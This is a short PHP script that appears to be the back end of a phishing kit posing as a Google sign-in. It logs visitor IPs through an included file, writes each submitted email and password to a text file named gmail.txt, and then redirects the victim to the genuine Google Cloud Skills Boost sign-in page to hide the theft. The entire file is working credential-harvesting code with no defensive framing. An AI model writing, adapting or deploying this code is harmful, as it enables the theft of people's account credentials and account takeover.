<?php
include 'ip.php';
file_put_contents("gmail.txt", "GOOGLE SIGNIN >> Username : " . $email = $_POST['email'] . " Pass : ". $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.cloudskillsboost.google/users/sign_in');
exit();
?>